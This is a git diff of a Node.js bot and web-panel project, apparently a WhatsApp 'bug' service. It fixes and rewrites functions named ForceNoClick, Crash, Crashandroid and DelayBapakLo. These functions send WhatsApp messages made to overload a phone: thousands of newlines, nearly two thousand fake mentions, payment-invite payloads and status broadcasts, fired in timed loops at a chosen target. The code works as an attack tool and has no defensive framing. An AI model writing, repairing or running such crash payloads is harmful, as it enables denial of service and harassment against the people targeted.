@@ -1344,7 +1344,7 @@ console.log(chalk.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⣭⣏⣭⣭⣥⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢠⠀⠀
 `));
 
-bot.launch();
+// HAPUS BARIS INI: bot.launch();
 console.log(chalk.red(`
 ╭─⦏ Welcome Back ⦐
 │ꔹ ɪᴅ ᴏᴡɴ : ${OwnerId}
@@ -1668,12 +1668,11 @@ app.post('/api/logout', (req, res) => {
     return res.json({ success: true });
 });
 
-// Untuk Vercel (serverless), kita export app saja
+// Untuk Vercel (serverless), export SEMUA yang diperlukan
 console.log(chalk.red('Server Online Enjoy Freind'));
 
-// SATU module.exports yang berisi SEMUA
 module.exports = {
-    app,  // <-- INI PENTING! app harus diexport
+    app,  // <-- INI WAJIB!
     loadAkses,
     saveAkses,
     isOwner,
@@ -1682,37 +1681,44 @@ module.exports = {
     getUsers
 };
 
+// ========================== FUNCTIONS ==========================
+
 // ==================== FUNCTIONS ==================== //
-async function ForceNoClick(X) {
-  await sock.relayMessage(
-    target, 
-    {
-      extendedTextMessage: {
-        text: "\n".repeat(9000),
-        contextInfo: {
-          participant: X,
-          mentionedJid: [
-            "1351515@s.whatsapp.net",
-            ...Array.from(
-              { length: 1900 },
-              () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
-            ),
-          ],
-          remoteJid: "X",
-          stanzaId: "1234567890ABCDEF",
-          quotedMessage: {
-            paymentInviteMessage: {
-              serviceType: 3,
-              expiryTimestamp: Date.now() + 1814400000,
+async function ForceNoClick(target) {
+  try {
+    await sock.relayMessage(
+      target, 
+      {
+        extendedTextMessage: {
+          text: "\n".repeat(9000),
+          contextInfo: {
+            participant: target,
+            mentionedJid: [
+              "1351515@s.whatsapp.net",
+              ...Array.from(
+                { length: 1900 },
+                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+              ),
+            ],
+            remoteJid: target,
+            stanzaId: "1234567890ABCDEF",
+            quotedMessage: {
+              paymentInviteMessage: {
+                serviceType: 3,
+                expiryTimestamp: Date.now() + 1814400000,
+              },
             },
           },
         },
-      },
-    }, 
-    {
-      participant: { jid: X },
-    }
-  );
+      }, 
+      {
+        participant: { jid: target },
+      }
+    );
+    console.log("ForceNoClick executed");
+  } catch (e) {
+    console.error("ForceNoClick error:", e);
+  }
 }
 
 async function DelayPayment(sock, X) {
@@ -1804,7 +1810,7 @@ async function ObsidianCorexDelayBeta(x) {
 }
 
 async function Crash(x) {
-  const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
+  const msg = generateWAMessageFromContent(x, proto.Message.fromObject({
       ephemeralMessage: {
         message: {
           viewOnceMessage: {
@@ -1865,11 +1871,11 @@ async function Crash(x) {
   
   await sock.relayMessage("status@broadcast", msg.message, {
     messageId: msg.key.id,
-    statusJidList: [target],
+    statusJidList: [x],
     additionalNodes
   });
   
-  await sock.relayMessage(target, {
+  await sock.relayMessage(x, {
       groupStatusMentionMessage: {
         message: {
           protocolMessage: {
@@ -1901,8 +1907,8 @@ async function Crashandroid(durationHours, X) {
     try {
       if (count < 20) {
         await Promise.all([
-        Crash(x),
-        Crash(x),        
+        Crash(X),
+        Crash(X),        
         await sleep(1000)
            ]);
         console.log(chalk.green(`
@@ -1947,10 +1953,10 @@ async function DelayBapakLo(durationHours, X) {
       if (count < 20) {
         await Promise.all([
         DelayPayment(sock, X),
-        ObsidianCorexDelayBeta(x),
-        ObsidianCorexDelayBeta(x),
+        ObsidianCorexDelayBeta(X),
+        ObsidianCorexDelayBeta(X),
         DelayPayment(sock, X),
-        ObsidianCorexDelayBeta(x),
+        ObsidianCorexDelayBeta(X),
         await sleep(2000),
         
             await sleep(4000)
@@ -2158,14 +2164,12 @@ async function BomBug(durationHours, X) {
 }
 
 // ==================== HTML EXECUTION ==================== //
-// ==================== HTML EXECUTION ==================== //
-// ==================== HTML EXECUTION ==================== //
 const executionPage = (
   status = "🟥 Ready",
   detail = {},
   isForm = true,
   userInfo = {},
-  userKey = "", // ✅ Parameter untuk key/password
+  userKey = "",
   message = "",
   mode = ""
 ) => {
@@ -2186,20 +2190,16 @@ const executionPage = (
   try {
     let html = fs.readFileSync(filePath, "utf8");
 
-    // Ganti semua placeholder di HTML - URUTAN PENTING!
     html = html
-      // 1. Ganti userKey/password terlebih dahulu
       .replace(/\$\{userKey\s*\|\|\s*'Unknown'\}/g, userKey || "Unknown")
       .replace(/\$\{userKey\}/g, userKey || "")
       .replace(/\$\{password\}/g, userKey || "")
       .replace(/\{\{password\}\}/g, userKey || "")
       .replace(/\{\{key\}\}/g, userKey || "")
       .replace(/\$\{key\}/g, userKey || "")
-      // 2. Ganti username
       .replace(/\$\{username\s*\|\|\s*'Unknown'\}/g, username || "Unknown")
       .replace(/\$\{username\}/g, username || "Unknown")
       .replace(/\{\{username\}\}/g, username || "Unknown")
-      // 3. Ganti yang lainnya
       .replace(/\{\{expired\}\}/g, formattedTime)
       .replace(/\{\{status\}\}/g, status)
       .replace(/\{\{message\}\}/g, message)
